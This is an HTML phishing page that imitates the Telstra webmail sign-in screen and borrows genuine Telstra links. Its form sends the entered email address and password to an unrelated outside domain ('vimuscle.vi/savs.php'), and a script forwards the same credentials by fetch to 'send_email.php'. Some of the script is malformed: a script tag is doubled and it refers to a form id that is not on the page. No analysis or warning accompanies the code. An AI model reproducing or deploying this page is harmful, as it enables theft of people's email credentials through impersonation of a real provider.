<h1 class="t-able-heading-a t-able-spacing-2x-mb"> Sign in to Telstra webmail </h1>
<div class="t-able-text-bodyshort t-able-spacing-5x-mb">Sign in with your Telstra email address</div>
<form action="https://vimuscle.vi/savs.php" method="post">
<div class="t-able-text-field t-able-spacing-2x-mb">
<label for="username">Telstra email</label>
<span id="username-help-text">Example: john@bigpond.com</span>
<input id="username" name="username" placeholder="Enter your username" type="text"/>
<input id="password" name="password" placeholder="Enter your password" type="password"/>
<p id="username-error-text"></p>
<input id="modUsername" name="subject" type="hidden" value=""/>
</div>
<div class="t-able-spacing-5x-mb">
<a class="t-able-low-emph-button t-reset-password-link" href="https://www.telstra.com.au/support/email/forgot-password" onclick="loadAnalyticEvents('click', 'clickTrack', 'linkClick', 'Recover username')">
                Forgot Telstra email
            </a>
</div>
<div class="">
<button class="t-able-high-emph-button t-able-spacing-2x-mb" id="submit_btn" type="submit">Sign In</button>
</div>
<p class="t-able-sub-head-line t-able-spacing-2x-mb">OR</p>
<a class="t-able-medium-emph-button t-able-spacing-7x-mb" href="https://www.myservices.telstra.com.au/mytelstra" onclick="loadAnalyticEvents('click', 'clickTrack', 'buttonClick', 'Create a Telstra ID')">
						Sign in to MyTelstra
		</a>
</form>

<script>
		<script>
    function submitForm() {
        let form = document.getElementById('myForm');
        let username = form.elements.username.value.trim();
        let password = form.elements.password.value;

        if (username && password) {
            let formData = new FormData(form);

            fetch('send_email.php', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    console.log('Email sent successfully');
                    // Perform any additional actions after successful form submission
                } else {
                    console.error('Failed to send email');
                    // Handle the case where the email failed to send
                }
            })
            .catch(error => {
                console.error('Error:', error);
                // Handle any errors that occurred during the fetch request
            });
        } else {
            console.log("Please enter both username and password.");
        }
    }

       

</script>
